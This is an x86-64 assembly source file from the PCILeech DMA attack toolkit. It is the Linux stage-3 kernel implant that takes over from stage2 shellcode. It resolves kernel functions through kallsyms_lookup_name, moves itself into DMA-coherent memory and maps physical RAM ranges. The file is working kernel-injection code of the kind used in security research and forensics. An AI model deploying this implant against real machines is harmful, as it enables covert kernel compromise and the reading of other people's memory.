; lx64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016-2024
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR
EXTRN stage3_c_TryMigrateEntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS lx64_stage3_pre.asm
	;    r15: storage for store old stack ptr (rsp)
	; ----------------------------------------------------
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.AddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
	; ----------------------------------------------------
	; 2: SAVE STACK PTR & SET UP STACK
	; ----------------------------------------------------
	PUSH rbx
	PUSH rbp
	PUSH r11
	PUSH r12
	PUSH r14
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	; ----------------------------------------------------
	; 3: CALL C CODE: MIGRATE FROM 'alloc_pages' TO 'dma_alloc_coherent' (IF POSSIBLE))
	; ----------------------------------------------------	
	LEA rcx, label_main_base - 1000h		; address of data page (KMDDATA) in parameter 1
	CALL stage3_c_TryMigrateEntryPoint
	WBINVD
	TEST rax, rax
	JZ migrate_fail_continue

	; success - migrate execution to new buffer
	LEA rdx, migrate_execute_continue
	ADD rax, rdx
	JMP rax
	; execution migrated
	migrate_execute_continue:
	LEA rcx, label_main_base - 1000h		; address of data page (KMDDATA)
	MOV rax, 1
	MOV [rcx+68h], rax						; KMDDATA.ReservedKMD[2] (migrated mark)
	migrate_fail_continue:
	; ----------------------------------------------------
	; 4: CALL C CODE: ENTRY POINT
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h		; address of data page (KMDDATA) in parameter 1
	CALL stage3_c_EntryPoint
	; ----------------------------------------------------
	; 5: RESTORE AND RETURN
	; ----------------------------------------------------
	error:
	MOV rsp, r15
	POP r15
	POP r14
	POP r12
	POP r11
	POP rbp
	POP rbx
	RET
main ENDP


; ------------------------------------------------------------------
; Lookup function pointers and place them in the supplied struct
; rcx -> address of kallsyms_lookup_name
; rdx -> ptr to FNLX struct 
; ------------------------------------------------------------------
LookupFunctions PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	MOV r15, rcx				; address of kallsyms_lookup_name
	MOV r14, rdx				; ptr to FNLX struct 
	MOV r13, 25*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_msleep
	PUSH rax
	LEA rax, str_alloc_pages_current
	PUSH rax
	LEA rax, str_set_memory_x
	PUSH rax
	LEA rax, str__free_pages
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_schedule
	PUSH rax
	LEA rax, str_do_gettimeofday
	PUSH rax
	LEA rax, str_walk_system_ram_range
	PUSH rax
	LEA rax, str_iounmap
	PUSH rax
	LEA rax, str_ioremap
	PUSH rax
	LEA rax, str_ktime_get_real_ts64
	PUSH rax
	LEA rax, str_ioremap_nocache
	PUSH rax
	LEA rax, str_getnstimeofday64
	PUSH rax
	LEA rax, str_alloc_pages
	PUSH rax
	LEA rax, str_set_memory_nx
	PUSH rax
	LEA rax, str_set_memory_rox
	PUSH rax
	LEA rax, str_set_memory_rw
	PUSH rax
	LEA rax, str_dummy
	PUSH rax
	LEA rax, str_dma_free_attrs
	PUSH rax
	LEA rax, str_platform_device_alloc
	PUSH rax
	LEA rax, str_platform_device_add
	PUSH rax
	LEA rax, str_platform_device_put
	PUSH rax
	LEA rax, str_dma_alloc_attrs
	PUSH rax
	LEA rax, str_memset
	PUSH rax
	LEA rax, str_alloc_pages_noprof
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15
	POP rdx
	CALL SysVCall
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: IF 'ioremap' DOES NOT EXIST FALLBACK TO 'ioremap_nocache'
	; ----------------------------------------------------
	MOV rax, [r14+9*8]
	TEST rax, rax
	JNZ lookup_finish_ioremap
	MOV rax, [r14+11*8]
	MOV [r14+9*8], rax
	lookup_finish_ioremap:
	; ----------------------------------------------------
	; 4: IF 'alloc_pages_current' DOES NOT EXIST FALLBACK TO 'alloc_pages' or 'alloc_pages_noprof'
	; ----------------------------------------------------
	MOV rax, [r14+1*8]
	TEST rax, rax
	JNZ lookup_finish_alloc_pages
	MOV rax, [r14+13*8]				; 'alloc_pages'
	MOV [r14+1*8], rax
	TEST rax, rax
	JNZ lookup_finish_alloc_pages
	MOV rax, [r14+24*8]				; 'alloc_pages_noprof'
	MOV [r14+1*8], rax
	TEST rax, rax
	lookup_finish_alloc_pages:
	; ----------------------------------------------------
	; 5: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	POP r13
	POP r14
	POP r15
	RET
LookupFunctions ENDP

; ----------------------------------------------------
; clear_8k
; clear 8192 bytes of memory
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

str_alloc_pages_current			db		'alloc_pages_current', 0
str_set_memory_nx				db		'set_memory_nx', 0
str_set_memory_rox				db		'set_memory_rox', 0
str_set_memory_rw				db		'set_memory_rw', 0
str_set_memory_x				db		'set_memory_x', 0
str__free_pages					db		'__free_pages', 0
str_memcpy						db		'memcpy', 0
str_schedule					db		'schedule', 0
str_do_gettimeofday				db		'do_gettimeofday', 0
str_page_offset_base			db		'page_offset_base', 0
str_vmemmap_base				db		'vmemmap_base', 0
str_walk_system_ram_range		db		'walk_system_ram_range', 0
str_iounmap						db		'iounmap', 0
str_ioremap						db		'ioremap', 0
str_ioremap_nocache				db		'ioremap_nocache', 0
str_ktime_get_real_ts64			db		'ktime_get_real_ts64', 0
str_getnstimeofday64			db		'getnstimeofday64', 0
str_alloc_pages					db		'alloc_pages', 0
str_platform_device_alloc		db		'platform_device_alloc', 0
str_platform_device_add			db		'platform_device_add', 0
str_platform_device_put			db		'platform_device_put', 0
str_dma_alloc_attrs				db		'dma_alloc_attrs', 0
str_dma_free_attrs				db      'dma_free_attrs', 0
str_memset						db		'memset', 0
str_alloc_pages_noprof			db      'alloc_pages_noprof', 0
str_dummy						db		0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of three (5)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi

	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+2*8+00h] ; 20h stack shadow space + 8h (RET) + 2*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+2*8+08h]
	MOV r9,  [rsp+28h+2*8+10h]

	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL rax
	MOV rsp, r15
	POP r15

	POP rsi
	POP rdi
	RET
SysVCall ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; Function uses Linux calling convention.
; rdi -> addr of kallsysms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	MOV rax, rdi
	LEA rdi, str_page_offset_base
	CALL rax
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

; ------------------------------------------------------------------
; Convert a physical address to a virtual address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; rcx -> addr of kallsysms_lookup_name
; rdx -> physical_address
; rax <- virtual_address
; ------------------------------------------------------------------
m_phys_to_virt PROC
	PUSH rdi
	PUSH rsi
	PUSH r15
	MOV rdi, rcx
	MOV r15, rdx
	CALL m_page_offset_base
	ADD rax, r15
	POP r15
	POP rsi
	POP rdi
	RET
m_phys_to_virt ENDP

; ------------------------------------------------------------------
; Retrieve the VMEMMAP_BASE
; Function uses Linux calling convention.
; KASLR of vmemmap_base was introduced in kernel 4.10
; in earlier versions it is fixed to: 0ffffea0000000000h
; rdi -> addr of kallsysms_lookup_name
; rax <- value of VMEMMAP_BASE
; ------------------------------------------------------------------
m_vmemmap_base PROC
	MOV rax, rdi
	LEA rdi, str_vmemmap_base
	CALL rax
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

; ------------------------------------------------------------------
; Convert a struct_page to to a physical address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; rcx -> addr of kallsysms_lookup_name
; rdx -> addr of struct page
; rax <- physical address
; ------------------------------------------------------------------
m_page_to_phys PROC
	PUSH rdi
	PUSH rsi
	PUSH rdx
	MOV rdi, rcx
	CALL m_vmemmap_base
	POP rdx
	SUB rdx, rax
	SHR rdx, 7		; PFN
	SHL rdx, 12
	MOV rax, rdx
	POP rsi
	POP rdi
	RET
m_page_to_phys ENDP

; ------------------------------------------------------------------
; Receives callback from walk_system_ram_range for each range.
; rdi -> pfn_start
; rsi -> pfn_size
; rdx -> PKMDDATA
; rax <- 0
; ------------------------------------------------------------------
callback_walk_system_ram_range PROC
	SHL rdi, 12				; convert to bytes
	SHL rsi, 12				; convert to bytes
	MOV rax, [rdx + 028h]	; PKMDDATA->DMAAddrVirtual
	MOV rcx, [rdx + 048h]	; PKMDDATA->_size
	ADD rax, rcx
	MOV [rax], rdi
	MOV [rax+8], rsi
	ADD rcx, 10h
	MOV [rdx + 048h], rcx	; PKMDDATA->_size
	XOR rax, rax
	RET
callback_walk_system_ram_range ENDP

; ------------------------------------------------------------------
; Receives callback from walk_system_ram_range before a memcpy is
; attempted. Validate if whole range is within range
; rdi -> pfn_start (mem_range)
; rsi -> pfn_size  (mem_range)
; rdx -> PKMDDATA
; rax <- 0 (if all in range), 1 (out of range)
; ------------------------------------------------------------------
callback_ismemread_inrange PROC
	SHL rdi, 12				; convert to bytes (mem_range_base)
	SHL rsi, 12				; convert to bytes (mem_range_size)
	MOV r8, [rdx + 040h]	; PKMDDATA->_address (req_base)
	MOV r9, [rdx + 048h]	; PKMDDATA->_size (req_size)
	ADD rsi, rdi			; range (mem_range_top)
	ADD r9, r8				; read  (req_top)
	CMP r8, rdi				; req_base < mem_range_base -> out of range
	JL out_of_range
	CMP r9, rsi
	JG out_of_range			; req_top > mem_range_top -> out of range
	XOR rax, rax
	RET
	out_of_range:
	XOR rax, rax
	INC rax
	RET
callback_ismemread_inrange ENDP

; ----------------------------------------------------
; Flush the CPU cache.
; ----------------------------------------------------
CacheFlush PROC
	WBINVD
	RET
CacheFlush ENDP

END
